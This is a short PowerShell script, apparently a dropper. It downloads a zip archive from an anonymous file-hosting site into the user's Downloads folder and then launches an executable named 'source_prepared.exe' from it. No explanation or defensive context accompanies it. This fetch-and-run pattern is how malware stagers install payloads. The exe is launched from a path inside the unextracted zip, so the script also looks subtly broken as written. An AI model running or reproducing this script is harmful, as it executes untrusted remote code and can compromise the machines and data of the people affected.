$downloadUrl = "https://files.catbox.moe/o4cn1q.zip"
Invoke-WebRequest $downloadUrl -OutFile $env:USERPROFILE\Downloads\o4cn1q.zip
Start-Process $env:USERPROFILE\Downloads\o4cn1q.zip\source_prepared.exe -Wait
